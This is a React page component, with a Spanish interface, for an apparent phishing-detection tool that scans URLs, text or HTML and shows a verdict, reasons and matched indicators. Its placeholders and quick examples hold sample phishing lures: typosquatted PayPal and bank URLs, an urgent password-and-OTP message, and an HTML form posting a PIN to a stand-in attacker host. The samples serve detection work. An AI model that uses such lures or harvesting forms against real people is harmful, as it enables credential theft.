import React, { useState } from "react";
import { A } from "../api/client";
import { Badge, Btn, Card, Input, PageHeader, Select } from "../components/ui";
import { errMsg, toast } from "../stores/toastStore";

export default function Scan() {
  const [mode, setMode] = useState("url");
  const [val, setVal] = useState("");
  const [channel, setChannel] = useState("web");
  const [res, setRes] = useState(null);
  const [loading, setLoading] = useState(false);

  async function go(e) {
    e.preventDefault();
    if (!val.trim()) return toast.error("Introduce el contenido a analizar");
    setLoading(true);
    try {
      setRes(await A.scan({ [mode]: val.trim(), channel }));
      toast.success("Análisis completado");
    } catch (err) {
      toast.error(errMsg(err, "Error al escanear"));
    } finally {
      setLoading(false);
    }
  }

  const setExample = (urlExample, channelExample = "web") => {
    setMode("url");
    setVal(urlExample);
    setChannel(channelExample);
  };

  return (
    <div>
      <PageHeader title="Escanear y Analizar Contenido" />

      <form onSubmit={go} className="bg-white p-5 rounded-lg border border-slate-200 shadow-sm space-y-4">
        <div className="flex flex-wrap items-center gap-2">
          {["url", "text", "html"].map((m) => (
            <button
              type="button"
              key={m}
              onClick={() => setMode(m)}
              className={`px-3 py-1.5 rounded text-xs font-semibold uppercase tracking-wider transition-colors ${
                mode === m ? "bg-blue-600 text-white" : "bg-slate-100 text-slate-700 hover:bg-slate-200"
              }`}
            >
              {m}
            </button>
          ))}
          <div className="ml-auto flex items-center gap-2">
            <span className="text-xs font-medium text-slate-500">Canal:</span>
            <Select value={channel} onChange={(e) => setChannel(e.target.value)}>
              {["email", "sms", "web", "qr", "vishing", "otro"].map((c) => (
                <option key={c} value={c}>
                  {c.toUpperCase()}
                </option>
              ))}
            </Select>
          </div>
        </div>

        {mode === "url" ? (
          <div>
            <Input
              placeholder="Ej.: https://paypal-secure-login.example/verify o http://bbva-seguro-online.example/login"
              value={val}
              onChange={(e) => setVal(e.target.value)}
            />
            <div className="mt-2 flex gap-2 flex-wrap text-xs text-slate-500 items-center">
              <span>Ejemplos rápidos:</span>
              <button
                type="button"
                className="text-blue-600 hover:underline"
                onClick={() => setExample("http://paypa1-secure-login.example/verify")}
              >
                Typosquat PayPal (paypa1)
              </button>
              <span>•</span>
              <button
                type="button"
                className="text-blue-600 hover:underline"
                onClick={() => setExample("http://bbva-seguro-online.example/activa")}
              >
                Blacklist BBVA
              </button>
              <span>•</span>
              <button
                type="button"
                className="text-blue-600 hover:underline"
                onClick={() => setExample("https://phishguard.bank/dashboard")}
              >
                Whitelist Corporativa
              </button>
            </div>
          </div>
        ) : (
          <textarea
            rows={7}
            className="w-full border border-slate-300 p-3 rounded font-mono text-sm focus:border-blue-500 outline-none"
            placeholder={
              mode === "html"
                ? '<form action="http://atacante.example/harvest"><input type="password" name="pin" /></form>'
                : "URGENTE: Su cuenta ha sido suspendida inmediatamente. Verifique su contraseña y OTP en las próximas 24 horas..."
            }
            value={val}
            onChange={(e) => setVal(e.target.value)}
          />
        )}

        <div className="flex justify-between items-center pt-1">
          <Btn disabled={loading}>{loading ? "Analizando heurísticas y amenazas…" : "Analizar con Motor SOC"}</Btn>
          {val && (
            <button
              type="button"
              onClick={() => {
                setVal("");
                setRes(null);
              }}
              className="text-xs text-slate-500 hover:text-slate-800"
            >
              Limpiar
            </button>
          )}
        </div>
      </form>

      {res && (
        <Card className="mt-6 border-l-4 border-l-blue-600 space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-3 pb-3 border-b border-slate-100">
            <div className="flex items-center gap-3">
              <h3 className="font-bold text-slate-900 text-lg">Resultado de la Detección</h3>
              <Badge value={res.verdict} />
            </div>
            <div className="text-sm">
              <span className="text-slate-500">Nivel de Confianza:</span>{" "}
              <span className="font-bold text-slate-800">{(res.confidence * 100).toFixed(1)}%</span>
            </div>
          </div>

          <div>
            <h4 className="text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Razones y Señales Detectadas</h4>
            <ul className="space-y-1 text-sm text-slate-700">
              {res.reasons.map((r, i) => (
                <li key={i} className="flex items-start gap-2">
                  <span className="text-blue-600 font-bold">•</span>
                  <span>{r}</span>
                </li>
              ))}
            </ul>
          </div>

          {res.matched_indicators.length > 0 && (
            <div className="bg-red-50 border border-red-200 rounded p-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-red-800 mb-2">IOCs Coincidentes con Base de Conocimiento</h4>
              <ul className="text-sm space-y-1">
                {res.matched_indicators.map((m) => (
                  <li key={m.indicator_id} className="text-red-900 font-mono text-xs">
                    <b>{m.value}</b> ({m.type})
                  </li>
                ))}
              </ul>
            </div>
          )}

          {res.llm && (
            <div className="bg-blue-50 border border-blue-100 p-3 rounded text-sm text-blue-900">
              <p className="font-semibold text-xs text-blue-800 uppercase tracking-wider mb-1">Evaluación Asistente LLM</p>
              <p>{res.llm.summary}</p>
            </div>
          )}

          <details className="text-sm">
            <summary className="cursor-pointer text-blue-600 hover:text-blue-800 font-medium select-none">
              Ver Features Técnicas Extraídas
            </summary>
            <pre className="mt-2 bg-slate-900 text-emerald-400 p-3 rounded overflow-auto text-xs font-mono">
              {JSON.stringify(res.features, null, 2)}
            </pre>
          </details>
        </Card>
      )}
    </div>
  );
}
